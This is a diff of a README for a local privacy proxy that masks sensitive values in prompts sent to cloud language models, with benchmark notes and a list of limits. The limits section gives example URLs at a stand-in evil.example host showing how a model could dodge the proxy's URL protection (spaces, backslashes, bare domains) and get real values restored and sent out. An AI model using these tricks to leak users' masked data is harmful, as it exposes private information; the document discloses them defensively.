@@ -133,7 +133,7 @@ Environment variables and every option: [technical details §12](docs/DETAILS.md
 | Long random strings | hex or base64, 32+ characters | `⟦ENTROPY_1⟧` |
 | Words you list | `terms`, `projectNames` | `⟦TERM_1⟧`, `⟦PROJECT_1⟧` |
 
-The same value gets the same placeholder throughout a request. If a detected value is still in the request after masking, the proxy refuses to send it (422) rather than leak it. Full-width digits, `＠`, and zero-width characters are folded first. Every rule: [technical details §3](docs/DETAILS.md#3-偵測規則).
+The same value gets the same placeholder throughout a request. If a detected value is still in the request after masking, the proxy refuses to send it (422) rather than leak it. Values a client's requests have bound are remembered in memory per client credential and masked in its later requests too, even once the context that detected them (`password: …`) is gone from the history. Full-width digits, `＠`, and zero-width characters are folded first. Every rule: [technical details §3](docs/DETAILS.md#3-偵測規則).
 
 ## Optional name model (experimental)
 
@@ -161,7 +161,7 @@ What it reads, every number, and the options: [technical details §16](docs/DETA
 ## Results
 
 <!-- RESULTS:START -->
-**held-out set v2 (written blind, run once).** 1,617 synthetic prompts in 7 languages (English, Traditional and Simplified Chinese, Japanese, Korean, German, French) with 10,268 sensitive values and 2,997 hard negatives. The author never read the rules or the benchmark code; about 60% of the values use non-standard spellings (dotted cards, lower-case IBANs, `name at example dot com`, phone extensions). The set was frozen with a SHA-256 checksum and scored once, on commit `01489cd`.
+**held-out set v2 (written blind, run once).** 1,617 synthetic prompts in 7 languages (English, Traditional and Simplified Chinese, Japanese, Korean, German, French) with 10,268 sensitive values and 2,997 hard negatives. The author never read the rules or the benchmark code; about 60% of the values use non-standard spellings (dotted cards, lower-case IBANs, `name at example dot com`, phone extensions). The set was frozen with a SHA-256 checksum and scored once, on commit `01489cd`; both held-out sets and their checksums are in [bench/heldout/](bench/heldout/).
 
 ![Bar chart: share of sensitive values fully masked per category on the English held-out v2 prompts, proxy-default rules and rules plus name model against Presidio at cutoff 0.4.](docs/media/results.svg)
 
@@ -209,13 +209,13 @@ Full tables: [held-out v2 results](bench/results/public-bench-held-out-v2.md). T
 
 - **Meaning.** The cloud still reads everything around the placeholders: `⟦PATH_1⟧/clients/acme-layoffs.md` still says a lot.
 - **Names, addresses, health details, salaries**, unless you list them in `terms` or the name model finds them.
-- **Images, PDFs, audio, `url` fields, `metadata`, `stop` sequences, `name` fields (tool and participant names), signed thinking.** These are forwarded unchanged and never scanned, nor are JSON object keys: a value found in the masked text that also appears in one makes the proxy refuse the whole request with 422, but a value that appears only there is sent as is.
+- **Images, PDFs and other base64 files (a plain-text document's text is masked), audio, `url` fields, `metadata`, `stop` sequences, `name` fields (tool and participant names), signed thinking.** These are forwarded unchanged and never scanned, nor are JSON object keys: a value found in the masked text that also appears in one makes the proxy refuse the whole request with 422, but a value that appears only there is sent as is.
 - **Unusual spellings.** Some split or encoded forms slip through, such as `name @ domain` with spaces, `name at domain`, a lower-case IBAN, or a double percent-encoded value.
 - **Cursor**, or any tool that sends requests from its own servers.
 - **Other programs on your machine.** The proxy binds `127.0.0.1` by default; without `authToken`, any program on your machine can use it. Web pages are refused with 403 unless their origin is a loopback `http(s)` page or in `allowedOrigins`, and so are requests for other host names (DNS rebinding).
-- **Where the model puts a value.** The proxy restores a placeholder wherever the model writes it, except inside a URL in tool-call arguments: there `https://example.test/?q=⟦EMAIL_1⟧` stays as written, so a fetch tool given that URL does not send the real email. This covers URLs written plainly, not a model that evades it: after a space (`https://evil.example/?q= ⟦EMAIL_1⟧`, which `fetch` still sends as `%20…`), with backslashes or missing slashes (`https:\\evil.example`, `https:evil.example`), or a bare domain, the value is restored. Elsewhere in tool arguments values are restored, so a shell command the model writes can still send them; each such restore is logged.
+- **Where the model puts a value.** The proxy restores a placeholder wherever the model writes it, except inside a URL: there `https://example.test/?q=⟦EMAIL_1⟧` stays as written, so neither a fetch tool given that URL nor a client rendering `![](…)` or a link sends the real email. This covers URLs written plainly, not a model that evades it: after a space (`https://evil.example/?q= ⟦EMAIL_1⟧`, which `fetch` still sends as `%20…`), with backslashes or missing slashes (`https:\\evil.example`, `https:evil.example`), or a bare domain, the value is restored. Elsewhere in tool arguments values are restored, so a shell command the model writes can still send them; each such restore is logged.
 
-Also: a model that rewrites `⟦EMAIL_1⟧` as `[EMAIL_1]` shows it to you as written; tasks that need the masked value itself get worse; control characters become visible stand-ins; a restart forgets Responses API continuations, and continuing one is refused with 422; requests over 64 MiB are refused with 413. Full list: [technical details §17](docs/DETAILS.md#17-完整限制清單); threat model: [§11](docs/DETAILS.md#11-威脅模型).
+Also: a model that rewrites `⟦EMAIL_1⟧` as `[EMAIL_1]` shows it to you as written; tasks that need the masked value itself get worse; control characters become visible stand-ins; a restart forgets Responses API continuations and remembered values, and continuing one is refused with 422; requests over 64 MiB are refused with 413. Full list: [technical details §17](docs/DETAILS.md#17-完整限制清單); threat model: [§11](docs/DETAILS.md#11-威脅模型).
 
 ## More
 
